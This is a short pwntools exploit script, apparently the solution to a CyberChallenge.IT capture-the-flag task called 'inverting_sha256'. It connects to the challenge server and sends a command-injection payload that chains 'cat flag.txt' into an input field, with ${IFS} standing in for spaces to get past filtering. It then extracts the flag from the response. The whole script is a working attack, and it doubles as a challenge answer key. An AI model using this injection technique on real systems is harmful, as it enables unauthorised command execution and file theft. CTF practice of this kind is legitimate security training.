#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./inverting_sha256_4fap")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("sha256.challs.cyberchallenge.it", 9403)

    return r


def main():
    r = conn()

    r.sendlineafter(b'Input: ', b'CCIT{";cat${IFS}flag.txt;echo${IFS}-n${IFS}"}')
    
    flag = re.match(r'.*CCIT{(.*)}.*', r.recvlineS()).group(1)
    log.warn(f'Flag obtained: CCIT{{{flag}}}')


if __name__ == "__main__":
    main()
